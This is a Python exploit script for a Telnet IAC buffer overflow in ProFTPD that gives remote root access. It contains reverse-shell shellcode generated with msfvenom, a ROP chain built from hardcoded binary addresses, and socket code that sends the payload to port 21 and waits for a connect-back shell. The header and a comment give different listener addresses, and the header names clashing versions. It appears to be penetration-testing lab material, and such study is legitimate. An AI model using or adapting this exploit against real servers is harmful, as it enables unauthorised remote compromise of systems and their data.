#!/usr/bin/python
## 
##//#############################################################################################################
##							##							#
## Vulnerability: ProFTPD IAC Remote Root Exploit	##  Telnet IAC Buffer Overflow (Linux)		 	#
## 							##  ProFTPD 1.3.2rc3				 	#
## Vulnerable Application: ProFTPD 1.3.3a	 	##  This is a part of the Metasploit Module, 		#
## Tested on Linux 2.6.32-5-686 			##  exploit/linux/ftp/proftp_telnet_iac			#
##							##							#
## Author: Muhammad Haidari				##  Spawns a reverse shell to 10.11.0.55:1234		#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python ProFTPD_exploit.py <Remote IP Address>

import sys,os,socket
import struct

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.60 LPORT=443 CMD=/bin/sh PrependChrootBreak=true --smallest -f python -v payload -b '\x09\x0a\x0b\x0c\x0d\x20\xff'
payload = b"\x6a\x1d\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
payload += b"\x13\x4b\x26\x1a\x69\x83\xeb\xfc\xe2\xf4\x7a\xef"
payload += b"\x2b\xb2\x21\x60\x42\xa4\xcb\x4c\x27\xe0\xa8\x4c"
payload += b"\x3d\x31\x86\xa6\x93\xb0\x13\xeb\x9a\x58\x8b\x76"
payload += b"\x7c\x01\x65\x08\x93\x8a\x21\x1b\x43\xd9\x47\xeb"
payload += b"\x9a\x8b\xb1\x4c\x27\xe0\x92\x7e\xd7\xe9\x7a\xfd"
payload += b"\xed\x8a\x18\x65\x49\x03\x49\xaf\xfb\xd9\x2d\xeb"
payload += b"\x9a\xfa\x12\x96\x25\xa4\xcb\x6f\x63\x90\x23\x2c"
payload += b"\x11\x69\x77\x4e\x18\x69\x4a\x9d\x93\x88\xfb\x40"
payload += b"\x4a\x38\x18\x95\x19\xe0\xaa\xeb\x9a\x3b\x23\x48"
payload += b"\x35\x1a\x23\x4e\x35\x46\x29\x4f\x93\x8a\x19\x75"
payload += b"\x93\x88\xfb\x2d\xd7\xe9"
# NOTE: All addresses are from the proftpd binary
IACCount = 4096+16
Offset = 0x102c-4
Ret = b"0x805a547" 	# pop esi / pop ebp / ret
Writable = b"0x80e81a0"  # .data

if len(sys.argv) < 2:
    print("\nUsage: " + sys.argv[0] + " <HOST>\n")
    sys.exit()

rop = struct.pack("<L",0xcccccccc) # unused
rop += struct.pack("<L",0x805a544) # mov eax,esi / pop ebx / pop esi / pop ebp / ret
rop += struct.pack("<L",0xcccccccc) # becomes ebx
rop += struct.pack("<L",0xcccccccc) # becomes esi
rop += struct.pack("<L",0xcccccccc) # becomes ebp
# quadruple deref the res pointer :)
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
# skip the pool chunk header
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
# execute the data :)
rop += struct.pack("<L",0x0805c26c) # jmp eax

buf = b''
buf += b'SITE '

buf += payload
if len(buf) % 2 == 0:
	buf += b"B"
	print("Buffer was aligned")

buf += b"\xff" * (IACCount - len(payload))
buf += b"\x90" * (Offset - len(buf))
addrs = struct.pack('<L',0x805a547) #Ret
addrs +=struct.pack('<L',0x80e81a0) #Writable
addrs +=rop
buf += addrs
buf += b"\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(buf)
print("Payload Successfully Send...Check your Multi/Handler")
print ("....Reverse shell is comming to you...")

data=s.recv(1024)
print(data)
s.close()
